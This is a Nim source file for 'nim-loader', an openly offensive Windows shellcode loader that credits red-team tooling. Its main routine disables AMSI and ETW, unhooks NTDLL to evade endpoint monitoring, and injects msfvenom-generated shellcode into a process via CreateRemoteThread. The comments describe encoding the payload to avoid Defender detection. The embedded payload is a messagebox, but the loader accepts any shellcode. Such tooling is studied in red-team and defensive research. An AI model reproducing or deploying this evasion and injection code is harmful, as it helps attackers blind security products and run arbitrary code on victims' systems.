#[
    nim-loader (v1.0.0)
    By Adam Svoboda (@adamsvoboda)

    References & Inspiration:
        - OffensiveNim by Marcello Salvati (@byt3bl33d3r)
        - NimlineWhispers2 by Alfie Champion (@ajpc500)
        - SysWhispers3 by klezVirus (@KlezVirus)
        - NimPackt-v1 by Cas van Cooten (@chvancooten)
        - unhook_bof.c by Mr. Un1k0d3r (@MrUn1k0d3r)
        - NimGetSyscallStub by S3cur3Th1sSh1t (@ShitSecure)

]#

# Syscalls
import syscalls/GetSyscallStub

# Evasion Techniques
import evasion/patchAMSI
import evasion/patchETW
import evasion/unhookNTDLL

# Shellcode Injection Techniques
import injection/createRemoteThread

when isMainModule:
    # Patch AMSI
    var amsiPatched = patchAMSI()
    echo "[*] AMSI disabled: ", amsiPatched

    # Patch ETW
    var etwPatched = patchETW()
    echo "[*] ETW disabled: ", etwPatched

    # Unhook NTDLL
    var unhookedNTDLL = unhookNTDLL()
    echo "[*] NTDLL Unhooked:", bool(unhookedNTDLL)

    # Run Shellcode
    when defined(windows):
        when defined(i386):
            echo "[!] 32bit is not supported."
            return 

        elif defined(amd64):
            # Using xor_dynamic encoder to stop Defender from detecting Metasploit shellcode, since we aren't 
            # implementing any sort of shellcode encryption yet!

            # msfvenom -p windows/x64/messagebox -e x64/xor_dynamic -f csharp
            var shellcode: array[345, byte] = [
            byte 0xeb,0x27,0x5b,0x53,0x5f,0xb0,0xbb,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,0x5e,
            0x8a,0x06,0x30,0x07,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,0xf1,0xf9,
            0x74,0x07,0x80,0x3e,0xbb,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,0xd4,0xff,0xff,
            0xff,0x10,0xbb,0xec,0x58,0x91,0xf4,0xe0,0xef,0xef,0xef,0xf8,0xc0,0x10,0x10,
            0x10,0x51,0x41,0x51,0x40,0x42,0x41,0x46,0x58,0x21,0xc2,0x75,0x58,0x9b,0x42,
            0x70,0x2e,0x58,0x9b,0x42,0x08,0x2e,0x58,0x9b,0x42,0x30,0x2e,0x58,0x9b,0x62,
            0x40,0x2e,0x58,0x1f,0xa7,0x5a,0x5a,0x5d,0x21,0xd9,0x58,0x21,0xd0,0xbc,0x2c,
            0x71,0x6c,0x12,0x3c,0x30,0x51,0xd1,0xd9,0x1d,0x51,0x11,0xd1,0xf2,0xfd,0x42,
            0x51,0x41,0x2e,0x58,0x9b,0x42,0x30,0x2e,0x9b,0x52,0x2c,0x58,0x11,0xc0,0x2e,
            0x9b,0x90,0x98,0x10,0x10,0x10,0x58,0x95,0xd0,0x64,0x7f,0x58,0x11,0xc0,0x40,
            0x2e,0x9b,0x58,0x08,0x2e,0x54,0x9b,0x50,0x30,0x59,0x11,0xc0,0xf3,0x4c,0x58,
            0xef,0xd9,0x2e,0x51,0x9b,0x24,0x98,0x58,0x11,0xc6,0x5d,0x21,0xd9,0x58,0x21,
            0xd0,0xbc,0x51,0xd1,0xd9,0x1d,0x51,0x11,0xd1,0x28,0xf0,0x65,0xe1,0x2e,0x5c,
            0x13,0x5c,0x34,0x18,0x55,0x29,0xc1,0x65,0xc6,0x48,0x2e,0x54,0x9b,0x50,0x34,
            0x59,0x11,0xc0,0x76,0x2e,0x51,0x9b,0x1c,0x58,0x2e,0x54,0x9b,0x50,0x0c,0x59,
            0x11,0xc0,0x2e,0x51,0x9b,0x14,0x98,0x58,0x11,0xc0,0x51,0x48,0x51,0x48,0x4e,
            0x49,0x4a,0x51,0x48,0x51,0x49,0x51,0x4a,0x58,0x93,0xfc,0x30,0x51,0x42,0xef,
            0xf0,0x48,0x51,0x49,0x4a,0x2e,0x58,0x9b,0x02,0xf9,0x59,0xef,0xef,0xef,0x4d,
            0x59,0xd7,0xd1,0x10,0x10,0x10,0x10,0x2e,0x58,0x9d,0x85,0xee,0x10,0x10,0x10,
            0x2e,0x5c,0x9d,0x95,0x1f,0x11,0x10,0x10,0x58,0x21,0xd9,0x51,0xaa,0x55,0x93,
            0x46,0x17,0xef,0xc5,0x58,0x21,0xd9,0x51,0xaa,0xe0,0xa5,0xb2,0x46,0xef,0xc5,
            0x58,0x75,0x7c,0x7c,0x7f,0x3c,0x30,0x76,0x62,0x7f,0x7d,0x30,0x5d,0x43,0x56,
            0x31,0x10,0x5d,0x75,0x63,0x63,0x71,0x77,0x75,0x52,0x7f,0x68,0x10,0xf1,0xf9]

            # CreateRemoteThread Example
            injectCreateRemoteThread(shellcode)

    

